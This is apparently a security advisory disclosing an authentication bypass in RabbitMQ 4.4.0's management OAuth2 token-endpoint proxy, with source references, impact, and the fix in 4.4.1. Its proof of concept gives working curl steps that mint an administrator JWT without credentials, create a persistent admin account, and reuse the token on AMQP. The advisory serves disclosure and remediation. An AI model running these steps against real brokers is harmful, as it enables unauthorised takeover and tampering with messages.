### Summary

The management plugin in RabbitMQ **4.4.0** exposes the OAuth2 token-endpoint proxy at
`/js/oidc-oauth/token-endpoint/<resource-server-id>` **without any caller authentication**.

## Incriminated source code (tag v4.4.0)

- `deps/rabbitmq_management/src/rabbit_mgmt_dispatcher.erl:52-55` — the token-endpoint
  route is registered without an authentication context.
- `deps/rabbitmq_management/src/rabbit_mgmt_oauth_token_proxy.erl:88-131` —
  `handle_token`/`forward_token_request` read the unauthenticated request body and
  forward it to the provider's token endpoint. The module does **not** implement the
  `is_authorized/3` callback that every authenticated management resource implements,
  so it is reachable anonymously.
- Same file, `inject_client_secret` (lines 125-131 on v4.4.0) — the configured
  `management.oauth_client_secret` is appended to the request body whenever the caller
  did not supply one. All other caller-supplied form parameters (including `scope`)
  are relayed verbatim.

## Effect

On deployments configured per the documented OAuth2 management setup, the broker acts
as a confidential OAuth2 client **on behalf of any anonymous network peer**. With a
permissive provider (such as the reference setups in the OAuth2 guide that grant
administrator scopes), an unauthenticated POST with `grant_type=client_credentials`
(or `password`) returns a signed JWT with attacker-chosen scope.

The minted token is accepted by the management API, and also by the AMQP 0-9-1
listener when placed in the SASL PLAIN password position
(`deps/rabbitmq_auth_backend_oauth2/src/rabbit_auth_backend_oauth2.erl:433-442` reads
the token from the password property), because audience validation only resolves a
resource server and is not bound to the listening plane.

## Fix status

Fixed on main by **PR #17937** (`check_grant_type` restricts relaying to
`authorization_code`/`refresh_token`); the fix ships in **4.4.1**. Two related
observations from my report were triaged separately by the team (provider
responsibility for fabricated code/refresh-token relays; `iss` assertion on the
backlog) and are not part of this advisory.

### Proof of concept

## Environment

Tested on the official `rabbitmq:4.4.0-management` Docker image (Erlang/OTP 29.1.2).

## Prerequisites

RabbitMQ 4.4.0 with the documented OAuth2 management integration. Minimal
`rabbitmq.conf` shape (values per your provider):

```ini
management.oauth_enabled = true
management.oauth_client_id = my_spa_client
management.oauth_client_secret = <the confidential client secret>
management.oauth_provider_url = https://<idp-host>
management.oauth_resource_servers.1.id = rabbitmq
auth_backends.1 = oauth2
auth_oauth2.resource_servers.1.id = rabbitmq
auth_oauth2.resource_servers.1.oauth_provider_id = default
auth_oauth2.oauth_providers.default.issuer = https://<idp-host>
auth_oauth2.oauth_providers.default.jwks_uri = https://<idp-host>/jwks.json
auth_oauth2.oauth_providers.default.token_endpoint = https://<idp-host>/token
```

with `rabbitmq_management` and `rabbitmq_auth_backend_oauth2` enabled, and a provider
that grants the SPA client administrator scopes (as in the guide's reference examples).

## Step 1 — mint a token without any credentials

No `Authorization` header, no client secret:

```bash
curl -s -X POST "http://HOST:15672/js/oidc-oauth/token-endpoint/rabbitmq" \
     -d "grant_type=client_credentials" -d "client_id=my_spa_client"
```

Response: `200 {"access_token":"eyJ...","token_type":"Bearer",...}` — the
provider-side request log shows the broker injected the client secret and the request
originated from the broker.

## Step 2 — prove privilege on the management API

```bash
curl -s "http://HOST:15672/api/whoami" -H "Authorization: Bearer <token>"
```

Response: `200 {"name":"...","tags":["administrator"],"is_internal_user":false}`

## Step 3 — privileged write (persistence)

```bash
curl -s -X PUT "http://HOST:15672/api/users/poc" \
     -H "Authorization: Bearer <token>" -H "content-type: application/json" \
     -d '{"password":"Poc12345678!","tags":"administrator"}'
```

Response: `201 Created`.

## Step 4 — data plane (cross-listener acceptance)

Present the same JWT in the SASL PLAIN password position against the AMQP port
(`\x00user\x00<jwt>`); the handshake completes and full queue operations
(declare/publish/consume/purge/delete) succeed on any vhost.

A self-contained black-box Python PoC (standard library only; HTTP + raw AMQP 0-9-1
frames) was attached to my original email report and is available on request.

### Impact

**Authentication bypass** (missing authentication for a critical function, **CWE-306**)
in the management plugin's OAuth2 token-endpoint proxy.

**Impacted deployments:** RabbitMQ 4.4.0 instances configured per the documented
OAuth2/SSO integration for the management UI (oauth2 backend enabled, provider with a
resource server, `management.oauth_client_secret` set — i.e. the confidential-client
token-proxy setup). No operator misconfiguration is involved; the affected setup is
the documented one.

**Impacted parties:** any unauthenticated remote attacker with network access to the
management port. Consequences (all verified in testing):

- attacker-chosen-scope JWT minting through the broker's own confidential client identity
- full management-plane takeover (administrator actions, persistent administrator account creation)
- full data-plane takeover on all vhosts via AMQP with the minted token (read, forge and destroy all messages)

**Suggested severity:** Critical — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` (9.8),
acknowledging the OAuth2-setup precondition; happy for maintainers to finalize the score.

**Remediation:** upgrade to 4.4.1 (PR #17937). Interim mitigations: remove
`management.oauth_client_secret`, or place authentication in front of the management port.
